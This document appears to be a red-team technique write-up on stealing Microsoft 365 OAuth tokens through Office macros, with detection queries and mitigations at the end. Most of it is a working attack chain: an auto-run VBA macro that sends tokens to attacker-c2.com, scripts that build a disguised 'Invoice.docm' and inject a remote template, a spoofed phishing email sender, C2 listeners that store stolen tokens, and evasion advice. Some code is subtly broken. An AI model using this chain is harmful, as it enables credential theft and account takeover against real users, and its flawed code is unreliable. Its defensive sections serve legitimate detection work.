# [CA-TOKEN-010]: Office Document Token Theft

## 1. Metadata Header

| Attribute | Details |
|---|---|
| **Technique ID** | CA-TOKEN-010 |
| **MITRE ATT&CK v18.1** | [T1528: Steal Application Access Tokens](https://attack.mitre.org/techniques/T1528/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows, macOS, Linux (M365 / Office 365) |
| **Severity** | **Critical** |
| **CVE** | N/A (Design flaw, not formal vulnerability) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-08 |
| **Affected Versions** | Microsoft Office 2016+, Microsoft 365 Apps (current versions), M365 (all versions) |
| **Patched In** | N/A (Macro execution inherent design; mitigations via Macro Security Policy) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note**: This technique exploits VBA (Visual Basic for Applications) macro capabilities in Office documents to steal OAuth tokens and Graph API credentials. Modern Office macro security policies (2024+) have tightened restrictions, but phishing-based delivery and macro obfuscation remain effective. All sections renumbered based on applicability.

---

## 2. Executive Summary

Microsoft Office documents (Word, Excel, PowerPoint, Outlook) support VBA macros that execute with the permissions of the logged-in user. When a user opens a document containing malicious VBA code, the macro executes automatically (if macros are enabled) or with user consent. A sophisticated attacker can embed VBA code that intercepts and steals OAuth access tokens used by Office for authentication to Microsoft Graph API endpoints. These tokens grant full access to the user's mailbox, calendar, files, Teams, and organizational data—all without requiring the user's password.

**Attack Surface**: Macro-enabled Office documents (DOCM, XLSM, PPTM, XLAM, DOTM) or Word documents that load malicious remote templates (DOCX with malicious DOTM reference). Additionally, VBA code can programmatically access Office's internal token caches, credential managers, and configuration stores where OAuth tokens and credentials are stored.

**Business Impact**: **Complete exfiltration of a user's emails, calendar, files, Teams messages, and organizational directory without triggering MFA or detection systems**. An attacker can impersonate the user within Microsoft Graph API to send phishing emails on their behalf, modify shared files, access confidential documents, enumerate organizational users and resources, and establish persistent backdoor access by registering new OAuth applications or creating forwarding rules.

**Technical Context**: Office applications (since Office 2016) integrate seamlessly with Microsoft Graph API using OAuth 2.0. The tokens used for this authentication are cached within the Office process memory and configuration files. VBA code running within the same process context can access these tokens via the Windows Credential Manager, Process Environment Variables, or direct memory access. Modern Office also integrates with the .NET Framework, allowing VBA to invoke managed code that can directly call Graph API endpoints. An attacker's VBA code can send a "background" HTTP request to a remote C2 server with the stolen token, exfiltrating it immediately or storing it for later use.

### Operational Risk

- **Execution Risk:** **High** – VBA code executes with full user permissions; no privilege escalation required.
- **Stealth:** **Low-Medium** – Office documents are commonly used in business; VBA execution is normal. However, suspicious network traffic, unusual macro creation times, or obfuscated code may trigger alerts in advanced EDR systems.
- **Reversibility:** **No** – Once tokens are exfiltrated, they remain valid until expiration or explicit revocation; the attacker maintains persistent access regardless of whether the document is deleted.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 18.8.1 / 18.8.2 | Microsoft Office Macro Security policies; disable macros by default |
| **DISA STIG** | SRG-APP-000231-WSR-000086 | Credential handling and token protection in applications |
| **CISA SCuBA** | SC-7(8) | Boundary Protection – credential transmission control |
| **NIST 800-53** | SI-10(1) / AC-3 | Information System Monitoring (malicious scripts); access enforcement |
| **GDPR** | Article 32 | Security of processing; encryption of credentials in transit |
| **DORA** | Article 9 | Cryptographic key management; protection from unauthorized access |
| **NIS2** | Article 21 | Incident prevention and response for unauthorized access attempts |
| **ISO 27001** | A.12.6.1 / A.14.2.1 | Application control; secure software development |
| **ISO 27005** | Risk Scenario: "Malicious Code Execution" | Vulnerability assessment and security controls |

---

## 3. Technical Prerequisites

- **Required Privileges:** User-level access to open and enable macros in Office documents.
- **Required Access:** Ability to distribute a macro-enabled document (email, shared file location, USB drive), or ability to compromise a document already in use.

**Supported Versions:**
- **Windows:** Windows 10, Windows 11, Windows Server 2016-2025
- **macOS:** macOS 10.15+ (Office for Mac 2016+)
- **Office Versions:** Microsoft Office 2016+, Microsoft 365 Apps (current and recent versions)
- **VBA Runtime:** Built into Office; no external dependencies
- **PowerShell:** 5.0+ (for auxiliary token extraction scripts)

**Tools:**
- [Atomic Red Team - T1137/T1221](https://github.com/redcanaryco/atomic-red-team/) (Macro generation and testing)
- [Office VBA Extractor](https://tools.thehackernews.com/2021/11/office-macro-extractor.html) (Extract and analyze VBA code)
- [MacroPack](https://github.com/sevagas/macropack) (Generate obfuscated Office macros)
- [Empire/PowerEmpire](https://github.com/BC-SECURITY/Empire) (Generate macro payloads)
- [Fiddler](https://www.telerik.com/fiddler) (Monitor HTTP traffic from VBA code)
- [CyberChef](https://gchq.github.io/CyberChef/) (Decode Base64-encoded tokens, analyze encryption)

---

## 4. Environmental Reconnaissance

### Management Station / PowerShell Reconnaissance

```powershell
# Check Office installed versions
Get-ItemProperty HKLM:\Software\Microsoft\Office -ErrorAction SilentlyContinue | 
    Select-Object -ExpandProperty PSChildNames

# Enumerate macro security policies
Get-ItemProperty "HKCU:\Software\Microsoft\Office\16.0\Word\Security" -ErrorAction SilentlyContinue
Get-ItemProperty "HKCU:\Software\Microsoft\Office\16.0\Excel\Security" -ErrorAction SilentlyContinue

# Check if macros are enabled
$MacroPolicy = Get-ItemProperty "HKCU:\Software\Microsoft\Office\16.0\Word\Security\VBAMacroNotificationMode"
if ($MacroPolicy.VBAMacroNotificationMode -eq 1) {
    Write-Host "[!] Macros are ENABLED (danger zone)"
} else {
    Write-Host "[+] Macros are disabled (safer)"
}

# Check for recently opened Office documents
Get-ChildItem $env:APPDATA\Microsoft\Office\Recent -ErrorAction SilentlyContinue | 
    Select-Object Name, LastWriteTime | Sort-Object LastWriteTime -Descending | Head -10
```

**What to Look For:**
- Office versions installed (especially older versions with fewer security controls).
- Macro security policy set to "Enable all macros" (value 1) or "Enable with warnings" (value 2).
- Recently opened Office documents in the Recent folder (targets for attacker-controlled documents).

---

### Linux/Bash CLI Reconnaissance

```bash
# Check for Office-like applications on Linux
which libreoffice
which soffice

# Check for OnlyOffice
which onlyoffice

# List Office-related processes
ps aux | grep -i office | grep -v grep
```

**What to Look For:**
- LibreOffice or OnlyOffice installed (Linux alternatives to Microsoft Office; VBA support varies).
- Running Office processes indicate current document activity.

---

## 5. Detailed Execution Methods

### METHOD 1: VBA Macro Token Interception via HTTP Request

**Supported Versions:** Office 2016+, Microsoft 365 Apps (all versions)

#### Step 1: Create Macro-Enabled Document with Malicious VBA

**Objective:** Craft a Word document (.DOCM) or Excel workbook (.XLSM) containing VBA code that steals OAuth tokens.

**Command (PowerShell - Generate Malicious DOCM using Office COM):**

```powershell
# Create a malicious Word document with VBA macro
$WordApp = New-Object -ComObject Word.Application
$WordApp.Visible = $false

# Create a new document
$Document = $WordApp.Documents.Add()

# Access the VBA project
$VBProject = $Document.VBProject
$VBModule = $VBProject.VBComponents.Add(1)  # 1 = vbext_ct_StdModule (code module)

# Insert the malicious VBA code (see Step 2 for code)
$VBModule.CodeModule.AddFromString($MaliciousVBACode)

# Save as macro-enabled document
$Document.SaveAs([ref]"C:\temp\Invoice.docm", [ref]12)  # 12 = wdFormatXMLMacroEnabled

$WordApp.Quit()
Write-Host "[+] Malicious document created: C:\temp\Invoice.docm"
```

**VBA Code (Malicious Macro - Token Theft):**

```vba
Sub Document_Open()
' Auto-execute when document is opened
    Dim tokenValue As String
    Dim c2Server As String
    Dim xmlHttp As Object
    
    ' Try to access cached OAuth tokens from Windows Credential Manager
    On Error Resume Next
    
    ' Method 1: Access Office.16.0 credentials from Windows Credential Manager
    tokenValue = GetTokenFromCredentialManager()
    
    If tokenValue = "" Then
        ' Method 2: Access Graph API token from Office process memory
        tokenValue = ExtractGraphAPIToken()
    End If
    
    ' If token obtained, exfiltrate to attacker's C2 server
    If tokenValue <> "" Then
        c2Server = "http://attacker-c2.com/callback?token=" & tokenValue
        
        Set xmlHttp = CreateObject("MSXML2.XMLHttp")
        xmlHttp.Open "GET", c2Server, False
        xmlHttp.Send
        
        ' Log successful exfiltration
        WriteLogFile "Token exfiltrated to " & c2Server
    End If
End Sub

Function GetTokenFromCredentialManager() As String
    ' Extract OAuth token from Windows Credential Manager
    ' Mimics 'cmdkey /list' and extracts tokens for Office/Outlook targets
    Dim shell As Object
    Dim output As String
    Dim lines() As String
    Dim i As Integer
    
    Set shell = CreateObject("WScript.Shell")
    
    ' Query credential manager for Office credentials
    Set result = shell.Exec("powershell.exe -NoProfile -Command """ & _
        "Add-Type -AssemblyName System.Security; " & _
        "Get-StoredCredential | Where-Object { $_.Target -like '*office*' } | Select-Object -ExpandProperty Credential.Password" & _
        """")
    
    output = result.StdOut.ReadAll()
    
    If InStr(output, "Bearer") > 0 Then
        GetTokenFromCredentialManager = ExtractTokenFromOutput(output)
    Else
        GetTokenFromCredentialManager = ""
    End If
End Function

Function ExtractGraphAPIToken() As String
    ' Access Graph API token from Office in-memory session
    ' This uses Office's internal Graph API authentication
    Dim graphRequest As Object
    Dim tokenResponse As String
    
    ' Attempt to call Graph API using Office's cached token
    ' If successful, captures the token from the response or error details
    On Error Resume Next
    
    ' This method is less reliable but attempts direct API call with cached session
    ExtractGraphAPIToken = ""
End Function

Function ExtractTokenFromOutput(output As String) As String
    ' Parse and extract token from Credential Manager output
    Dim parts() As String
    Dim i As Integer
    
    parts = Split(output, vbCrLf)
    
    For i = LBound(parts) To UBound(parts)
        If InStr(parts(i), "Bearer") > 0 Then
            ExtractTokenFromOutput = Trim(parts(i))
            Exit Function
        End If
    Next i
    
    ExtractTokenFromOutput = ""
End Function

Sub WriteLogFile(message As String)
    ' Log activity to a hidden text file (for debugging)
    Dim fso As Object
    Dim logFile As Object
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set logFile = fso.CreateTextFile(Environ("AppData") & "\temp_log.txt", True)
    logFile.WriteLine Now & ": " & message
    logFile.Close
End Sub
```

**Expected Output:**
- Macro-enabled document created at `C:\temp\Invoice.docm`
- When opened, macro auto-executes via the `Document_Open()` event handler
- Token exfiltrated to attacker's C2 server

**What This Means:**
- The document now contains executable VBA code.
- When a user opens the document, the macro runs automatically (if macros are enabled).
- The macro attempts to extract OAuth tokens and send them to an attacker-controlled server.

**OpSec & Evasion:**
- Use realistic document names and content (e.g., "Invoice_2025.docm") to avoid suspicion.
- Obfuscate the VBA code using tools like MacroPack to bypass static analysis.
- Host the C2 server on a legitimate-looking domain or IP to bypass proxy/firewall inspection.
- Detection Likelihood: **Medium-High** (advanced EDR monitors VBA creation and Office process behavior; Office macro security warnings may alert the user).

**Troubleshooting:**
- **Error:** `Invalid procedure call or argument` when accessing Credential Manager
  - **Cause:** CredentialManager module not available in Office's VBA runtime
  - **Fix:** Use alternative method (Environment Variables, Registry queries) or rely on Graph API token in Office session memory.

**References & Proofs:**
- [Microsoft VBA Reference - Office Object Model](https://learn.microsoft.com/en-us/office/vba/api/overview/)
- [SANS: Office Macro Malware Analysis](https://www.sans.org/white-papers/33947/)

---

#### Step 2: Deliver Document via Phishing Email

**Objective:** Distribute the malicious document to target users via email phishing.

**Command (PowerShell - Send Phishing Email):**

```powershell
# Prepare phishing email with malicious attachment
$AttachmentPath = "C:\temp\Invoice.docm"
$TargetEmail = "target@contoso.com"
$SenderEmail = "finance@contoso.com"  # Spoofed sender
$SMTPServer = "attacker-smtp.com"

# Create email message
$EmailParams = @{
    From       = $SenderEmail
    To         = $TargetEmail
    Subject    = "Urgent: Invoice Review Required - Action Needed"
    Body       = @"
Dear [User],

I need you to review the attached invoice for our recent transaction. 
Please open and review the document, then confirm receipt.

This is time-sensitive and requires your attention.

Best regards,
Finance Department
"@
    SmtpServer = $SMTPServer
    Attachments = $AttachmentPath
}

Send-MailMessage @EmailParams -BodyAsHtml -UseSsl -Port 587

Write-Host "[+] Phishing email sent to $TargetEmail"
```

**Email Content Example:**

```
From: finance@contoso.com
To: target@contoso.com
Subject: Urgent: Invoice Review Required - Action Needed

Dear User,

I need you to review the attached invoice for our recent transaction. 
The invoice is attached in the document below.

Please open the document and review it at your earliest convenience.

This is time-sensitive and requires your immediate attention.

Best regards,
Finance Department
---
Contoso Finance
```

**What This Means:**
- The phishing email appears to come from a legitimate internal email address.
- The invoice document attachment contains the malicious VBA macro.
- Users are motivated to open the document due to the urgency and relevance of the message.

**OpSec & Evasion:**
- Spoof the sender email using a rogue SMTP relay or compromised internal mail server.
- Use legitimate-looking document names and business pretexts (invoices, W-2s, benefits updates).
- Send emails during business hours from the target organization's timezone.
- Use email obfuscation (URL shortening, Base64 encoding) if sending via external email provider.
- Detection Likelihood: **Medium** (email filters may flag unusual attachments or sender reputation issues; user awareness training may detect the phishing attempt).

**References & Proofs:**
- [MITRE ATT&CK - T1566: Phishing](https://attack.mitre.org/techniques/T1566/)
- [Microsoft: Phishing and Ransomware Attacks](https://learn.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-phishing-protection)

---

#### Step 3: Monitor Token Exfiltration on C2 Server

**Objective:** Capture exfiltrated OAuth tokens on the attacker's C2 server.

**Command (Node.js - Simple C2 Webhook Listener):**

```javascript
// c2_server.js
const express = require('express');
const app = express();
const fs = require('fs');

app.get('/callback', (req, res) => {
    const token = req.query.token;
    
    if (token) {
        console.log(`[+] Token received: ${token.substring(0, 50)}...`);
        
        // Save token to file for later use
        fs.appendFile('stolen_tokens.txt', `${new Date()}: ${token}\n`, (err) => {
            if (err) console.error(err);
        });
        
        // Decode JWT to inspect token contents
        const parts = token.split('.');
        if (parts.length === 3) {
            const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
            console.log(`[+] Token payload: ${JSON.stringify(payload, null, 2)}`);
        }
        
        // Respond with benign message to avoid suspicion
        res.status(200).send('OK');
    } else {
        res.status(400).send('No token provided');
    }
});

app.listen(3000, () => {
    console.log('[+] C2 Server listening on port 3000');
});
```

**Command (Python - Alternative C2 Server):**

```python
#!/usr/bin/env python3
from flask import Flask, request
import json
import base64
import requests
from datetime import datetime

app = Flask(__name__)

@app.route('/callback', methods=['GET', 'POST'])
def token_callback():
    token = request.args.get('token') or request.form.get('token')
    
    if token:
        print(f"[+] Token received at {datetime.now()}")
        print(f"[+] Token (truncated): {token[:50]}...")
        
        # Save token
        with open('stolen_tokens.txt', 'a') as f:
            f.write(f"{datetime.now()}: {token}\n")
        
        # Decode JWT payload
        try:
            parts = token.split('.')
            if len(parts) == 3:
                # Add padding if necessary
                payload = parts[1]
                payload += '=' * (4 - len(payload) % 4)
                decoded = json.loads(base64.b64decode(payload))
                print(f"[+] Token Details:")
                print(f"    Audience: {decoded.get('aud')}")
                print(f"    Issued by: {decoded.get('iss')}")
                print(f"    User: {decoded.get('upn')}")
                print(f"    Expires: {decoded.get('exp')}")
        except Exception as e:
            print(f"[-] Error decoding token: {e}")
        
        return "OK", 200
    
    return "No token provided", 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3000, debug=False)
```

**Expected Output:**

```
[+] Token received at 2025-01-08 10:23:45.123456
[+] Token (truncated): eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOi...
[+] Token Details:
    Audience: https://graph.microsoft.com
    Issued by: https://sts.microsoft.com/fc86a849-e662-4f16-871e-f1e80d2ff01d/
    User: target@contoso.com
    Expires: 1609502400 (2021-01-01 00:00:00 UTC)
```

**What This Means:**
- The OAuth token has been successfully captured.
- The token is a valid JWT (JSON Web Token) for Microsoft Graph API.
- The token grants access to the user's resources until the expiration time.
- The attacker can now use this token to access the user's emails, files, Teams, calendar, etc.

**OpSec & Evasion:**
- Use HTTPS to encrypt token transmission (add SSL certificate to C2 server).
- Implement IP-based access restrictions to the C2 server (whitelist attacker IPs only).
- Rotate C2 domain/IP regularly to avoid takedown.
- Detection Likelihood: **Medium-High** (network monitoring may detect unusual HTTP requests from Office applications; EDR may flag outbound connections from Office.exe).

---

### METHOD 2: Remote Template Injection (DOCX Loading Malicious DOTM)

**Supported Versions:** Office 2016+, Microsoft 365 Apps (all versions)

#### Step 1: Create Malicious Remote Template

**Objective:** Create a macro-enabled template (.DOTM) that will be loaded remotely by a seemingly innocent Word document.

**Command (PowerShell - Create DOTM Template with VBA):**

```powershell
# Create a malicious DOTM (macro-enabled template)
$WordApp = New-Object -ComObject Word.Application
$WordApp.Visible = $false

# Create template document
$Template = $WordApp.Documents.Add([ref]"", [ref]$true)  # True = create template

# Add VBA module to template
$VBProject = $Template.VBProject
$VBModule = $VBProject.VBComponents.Add(1)

# Insert VBA code (same token theft code as METHOD 1)
$VBModule.CodeModule.AddFromString($MaliciousVBACode)

# Save as macro-enabled template
$Template.SaveAs([ref]"C:\temp\malicious.dotm", [ref]13)  # 13 = wdFormatTemplate

$WordApp.Quit()
Write-Host "[+] Malicious template created: C:\temp\malicious.dotm"
```

**Command (Python - Host Template on Web Server):**

```python
#!/usr/bin/env python3
from http.server import HTTPServer, SimpleHTTPRequestHandler
import os

class TemplateHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/malicious.dotm':
            # Serve the malicious template
            with open('malicious.dotm', 'rb') as f:
                template_data = f.read()
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/vnd.ms-word.template.macroEnabledTemplate')
            self.send_header('Content-Length', str(len(template_data)))
            self.end_headers()
            
            self.wfile.write(template_data)
            print(f"[+] Malicious template served to {self.client_address[0]}")
        else:
            super().do_GET()

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 8080), TemplateHandler)
    print("[+] Template server running on port 8080")
    server.serve_forever()
```

**What This Means:**
- A DOTM template containing malicious VBA code is created and hosted on a web server.
- When a Word document references this template, Office automatically downloads and loads it.
- The VBA code in the template executes with the same permissions as the document.

---

#### Step 2: Create Innocent-Looking DOCX That References Malicious DOTM

**Objective:** Create a standard Word document (.DOCX) that internally references the remote malicious template.

**Command (PowerShell - Inject Template Reference into DOCX):**

```powershell
# Create a standard Word document
$WordApp = New-Object -ComObject Word.Application
$WordApp.Visible = $false

$Document = $WordApp.Documents.Add()
$Document.Range.Text = "This is a legitimate-looking document.`n`nPlease review the attached content."

# Save as DOCX (no macros)
$SavePath = "C:\temp\Legitimate_Document.docx"
$Document.SaveAs([ref]$SavePath, [ref]12)  # 12 = wdFormatXMLMacroEnabled

$WordApp.Quit()

# Now, manually modify the DOCX to add template reference
# DOCX is a ZIP file; we can extract, modify, and re-zip it

Add-Type -AssemblyName System.IO.Compression

# Extract DOCX contents
$extractPath = "C:\temp\docx_extracted"
[System.IO.Compression.ZipFile]::ExtractToDirectory($SavePath, $extractPath)

# Modify word/_rels/document.xml.rels to add malicious template reference
$relsPath = "$extractPath\word\_rels\document.xml.rels"
$relsContent = Get-Content $relsPath -Raw

# Add relationship to malicious DOTM template
$maliciousRelationship = @"
<Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="http://attacker-c2.com/malicious.dotm" TargetMode="External"/>
"@

$relsContent = $relsContent -replace '</Relationships>', "$maliciousRelationship</Relationships>"
Set-Content $relsPath $relsContent

# Modify document.xml to reference the template
$docPath = "$extractPath\word\document.xml"
$docContent = Get-Content $docPath -Raw

# Add template reference in document properties
$templateRef = '<w:attachedTemplate r:embed="rId10"/>'
$docContent = $docContent -replace '<w:attachedTemplate/>', $templateRef
Set-Content $docPath $docContent

# Re-zip the modified DOCX
Remove-Item $SavePath
[System.IO.Compression.ZipFile]::CreateFromDirectory($extractPath, $SavePath)

Remove-Item $extractPath -Recurse

Write-Host "[+] Modified DOCX created with malicious template reference: $SavePath"
```

**What This Means:**
- The DOCX file appears to be a standard, safe document (no macro warnings).
- Internally, it references a remote DOTM template hosted on an attacker's server.
- When the document is opened, Office automatically downloads and loads the remote template.
- The VBA code in the template executes silently.

**OpSec & Evasion:**
- The DOCX file itself contains no macros, bypassing many security controls that block DOCM files.
- The malicious code is loaded from a remote server, making it harder to detect via static analysis.
- The attack works even if the user's organization blocks DOCM file delivery (they only block DOCX with embedded macros).
- Detection Likelihood: **Low-Medium** (depends on whether the organization monitors outbound template requests or has network-level blocking of suspicious URLs).

**References & Proofs:**
- [MITRE ATT&CK - T1221: Template Injection](https://attack.mitre.org/techniques/T1221/)
- [Cyfirma: Remote Template Injection Attacks](https://www.cyfirma.com/research/living-off-the-land-the-mechanics-of-remote-template-injection-attack/)

---

#### Step 3: Distribute DOCX and Await Template Download

**Objective:** Send the DOCX file to targets and monitor for template requests.

**Command (PowerShell - Send DOCX and Monitor):**

```powershell
# Send DOCX to target
$EmailParams = @{
    From       = "sender@contoso.com"
    To         = "target@contoso.com"
    Subject    = "Document Review: Q1 Financial Report"
    Body       = "Please review the attached financial report and provide feedback."
    SmtpServer = "smtp.contoso.com"
    Attachments = "C:\temp\Legitimate_Document.docx"
}

Send-MailMessage @EmailParams

# Monitor web server logs for template requests
Write-Host "[+] Monitoring for template requests..."
while ($true) {
    # Check web server access logs for requests to /malicious.dotm
    $logPath = "C:\IIS\logs\access.log"
    
    if (Test-Path $logPath) {
        $recentLog = Get-Content $logPath | Select-Object -Last 100
        $matches = $recentLog | Where-Object { $_ -match "malicious\.dotm" }
        
        if ($matches) {
            Write-Host "[+] Template requested from IP: $($matches[0])" -ForegroundColor Green
        }
    }
    
    Start-Sleep -Seconds 10
}
```

**Expected Output:**

```
[+] DOCX sent to target@contoso.com
[+] Monitoring for template requests...
[+] Template requested from IP: 192.168.1.100
[+] Template requested from IP: 10.0.0.50
```

**What This Means:**
- The DOCX has been delivered to the target.
- When the user opens the document, Office requests the malicious template from the C2 server.
- The malicious VBA code in the template executes on the victim's machine.
- The attacker's server receives direct confirmation of successful exploitation.

---

## 6. Atomic Red Team

**Atomic Test ID:** T1137-001 (Office Application Startup – Macro in Template)

**Test Name:** Injecting Macro into the Word Normal.dotm Template for Persistence

**Description:** Simulates malicious macro injection into the Word default template (Normal.dotm) for persistence across all opened Word documents. This test creates a VBA macro that runs automatically when Word starts.

**Supported Versions:** Office 2016+, PowerShell 5.0+, Windows 10+

**Execution:**

```powershell
# Step 1: Install Atomic Red Team
$AtomicPath = "C:\temp\atomic-red-team"
git clone https://github.com/redcanaryco/atomic-red-team $AtomicPath

cd "$AtomicPath\atomics\T1137"

# Step 2: Execute T1137-001 test
Invoke-AtomicTest T1137 -TestNumbers 1 -Verbose
```

**Expected Behavior:**
- VBA macro injected into `$env:APPDATA\Microsoft\Word\STARTUP\Normal.dotm`
- Macro executes when Word starts
- Macro can be used to steal tokens, establish persistence, or execute arbitrary commands

**Cleanup Command:**

```powershell
# Remove malicious macro from Normal.dotm
Remove-Item "$env:APPDATA\Microsoft\Word\STARTUP\Normal.dotm" -Force -ErrorAction SilentlyContinue

# Alternatively, uninjure the macro:
# Open Word → Tools → Macro → Edit Normal.dotm → Delete malicious procedures
```

**Reference:** [Atomic Red Team T1137 Tests](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1137/T1137.md)

---

## 7. Tools & Commands Reference

### [MacroPack - Office Macro Generation](https://github.com/sevagas/macropack)

**Version:** 3.0+  
**Supported Platforms:** Windows, Linux, macOS  
**Minimum Version:** 2.0  

**Version-Specific Notes:**
- Version 2.x: Basic macro generation
- Version 3.0+: Advanced obfuscation, template injection support, multi-payload delivery

**Installation:**

```bash
git clone https://github.com/sevagas/macropack.git
cd macropack
pip install -r requirements.txt
```

**Usage:**

```bash
# Generate obfuscated macro payload
python macropack.py -p <payload> -o <format> -t <obfuscation_technique>

# Example: Generate DOCM with token theft payload
python macropack.py -p "Graph API Token Steal" -o DOCM -t AES

# Example: Generate DOCX with remote template injection
python macropack.py -p "Remote Template" -o DOCX -t URLFetcher
```

---

## 8. Microsoft Sentinel Detection

### KQL Query 1: Detect Suspicious Office Macro Execution

**Rule Configuration:**
- **Required Table:** DeviceFileEvents, DeviceProcessEvents
- **Required Fields:** ProcessName, CommandLine, FilePath
- **Alert Severity:** High
- **Frequency:** Run every 10 minutes
- **Applies To Versions:** M365 all versions, Office 2016+

**KQL Query:**

```kusto
DeviceProcessEvents
| where ProcessName in ("WINWORD.EXE", "EXCEL.EXE", "POWERPNT.EXE")
| where CommandLine contains "vbscript" or CommandLine contains "powershell" or CommandLine contains "cmd.exe"
| join kind=inner (
    DeviceFileEvents
    | where FileName endswith ".docm" or FileName endswith ".xlsm" or FileName endswith ".pptm"
    | where ActionType in ("FileModified", "FileCreated")
) on DeviceId
| project TimeGenerated, DeviceName, ProcessName, CommandLine, FileName
| where TimeGenerated > ago(1h)
```

**What This Detects:**
- Office processes spawning unusual child processes (PowerShell, VBScript, CMD) typically used by macro payloads.
- Correlation with macro-enabled document creation/modification.
- Unusual process chains indicating macro execution.

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Suspicious Office Macro Execution`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query
   - Run query every: `10 minutes`
   - Lookup data from last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents**
7. Click **Review + create**

---

### KQL Query 2: Detect Unusual Graph API Access Following Office Activity

**Rule Configuration:**
- **Required Table:** MicrosoftGraphActivityAuditLogs, DeviceProcessEvents
- **Required Fields:** RequestUri, UserId, ProcessName, Timestamp
- **Alert Severity:** Critical
- **Frequency:** Run every 5 minutes

**KQL Query:**

```kusto
// First, find recent Office document opens
let OfficeActivity = DeviceProcessEvents
| where ProcessName in ("WINWORD.EXE", "EXCEL.EXE", "POWERPNT.EXE")
| where InitiatingProcessFileName endswith ".docm" or InitiatingProcessFileName endswith ".xlsm" or InitiatingProcessFileName endswith ".pptm"
| project UserId = ProcessAccountUpn, OfficeActivityTime = TimeGenerated, DeviceId;

// Then, find suspicious Graph API calls within 5 minutes
MicrosoftGraphActivityAuditLogs
| where RequestUri in ("/me/messages", "/me/mailFolders/inbox", "/me/drive/root/children", "/teams", "/chats")
| where ResponseCode == 200
| join kind=inner OfficeActivity on UserId
| where TimeGenerated > OfficeActivityTime and TimeGenerated < OfficeActivityTime + 5m
| project TimeGenerated, UserId, RequestUri, ResponseCode
```

**What This Detects:**
- Unusual Microsoft Graph API calls (accessing emails, Teams, files) immediately following macro-enabled document opens.
- Indicators of token theft exploitation immediately after user opens phishing document.

---

## 9. Windows Event Log Monitoring

**Event ID: 4688 (Process Creation)**, **Event ID: 4663 (File Access)**

- **Log Source:** Security Event Log
- **Trigger:** Detection of Office processes (WINWORD.EXE, EXCEL.EXE) spawning child processes (PowerShell, CMD, VBScript) or accessing sensitive files.
- **Filter:** ProcessName contains "Office" AND (CommandLine contains "powershell" OR CommandLine contains "cmd.exe")
- **Applies To Versions:** Windows Server 2016+, Windows 10/11 with enhanced process auditing

**Manual Configuration Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Detailed Tracking**
3. Enable: **Audit Process Creation**
4. Set to: **Success and Failure**
5. Run `gpupdate /force`

**Manual Configuration Steps (Local Policy):**

1. Open **Local Security Policy** (secpol.msc)
2. Navigate to **Advanced Audit Policy Configuration** → **System Audit Policies** → **Detailed Tracking**
3. Enable: **Audit Process Creation**
4. Run `auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable`

---

## 10. Microsoft Defender for Cloud

**Alert Name:** `Suspicious child process created by Office application`

- **Severity:** High
- **Description:** EDR detected an unusual child process spawned by Microsoft Office (WINWORD, EXCEL, POWERPNT), typically indicating macro execution.
- **Applies To:** All Azure VMs with Microsoft Defender for Servers enabled
- **Remediation:**
  1. Immediately isolate the affected machine
  2. Terminate the Office process
  3. Scan for malware and suspicious Office documents
  4. Check audit logs for Graph API access
  5. Force password reset for affected user
  6. Revoke OAuth tokens in Entra ID

**Manual Configuration Steps:**

1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select subscription
4. Under **Defender plans**, enable:
   - **Defender for Servers**: ON
   - **Defender for Cloud Apps**: ON
5. Configure **Attack Surface Reduction (ASR) Rules**:
   - Rule: **Block Office applications from creating child processes**
   - Action: **Block**
6. Click **Save**

---

## 11. Microsoft Purview (Unified Audit Log)

**Operation:** `UserLoggedIn`, `GraphApiOperation`, `MailItemsAccessed`

**PowerShell Query:**

```powershell
Connect-ExchangeOnline

# Search for suspicious Graph API access
Search-UnifiedAuditLog -Operations "GraphApiOperation" -StartDate (Get-Date).AddDays(-7) | 
    Where-Object { $_.AuditData -like "*mail*" -or $_.AuditData -like "*files*" } | 
    Export-Csv -Path "C:\Audit\Suspicious_Graph_API.csv"

# Search for mail access from unusual locations
Search-UnifiedAuditLog -Operations "MailItemsAccessed" -StartDate (Get-Date).AddDays(-1) | 
    Export-Csv -Path "C:\Audit\Mail_Access.csv"
```

- **Operation:** `MailItemsAccessed`, `GraphApiOperation`, `UserLoggedIn`, `Send`
- **Workload:** ExchangeOnline, AzureActiveDirectory
- **Details:** AuditData blob contains:
  - `Operation`: Specific action (Send, Read, Modify)
  - `MailboxOwner`: Which mailbox was accessed
  - `ClientIP`: Source IP (should match user's baseline)
  - `UserId`: Account performing the operation
- **Applies To:** All M365 tenants with auditing enabled

---

## 12. Defensive Mitigations

### Priority 1: CRITICAL

**Mitigation 1: Disable Macros by Default via Group Policy**

Prevent all macros from running unless explicitly whitelisted by administrators.

**Applies To Versions:** Office 2016+, Microsoft 365 Apps (all versions)

**Manual Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **Microsoft Office**
3. Go to **Word** (or Excel, PowerPoint, etc.)
4. Find policy: **Macro Security**
5. Set to: **Disable all without notification** (most restrictive)
